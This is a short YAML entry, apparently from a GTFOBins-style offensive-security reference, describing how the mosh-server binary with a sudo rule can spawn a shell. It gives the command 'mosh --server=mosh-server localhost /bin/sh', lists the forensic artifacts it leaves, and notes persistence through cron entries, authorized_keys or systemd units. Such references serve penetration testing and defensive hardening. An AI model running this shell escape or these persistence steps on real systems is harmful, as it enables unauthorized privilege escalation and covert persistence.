---
name: mosh-server
capabilities:
- exec
- spawn
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: mosh --server=mosh-server localhost /bin/sh
  notes: This requires a valid SSH access.
references:
- https://gtfobins.github.io/gtfobins/mosh-server/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
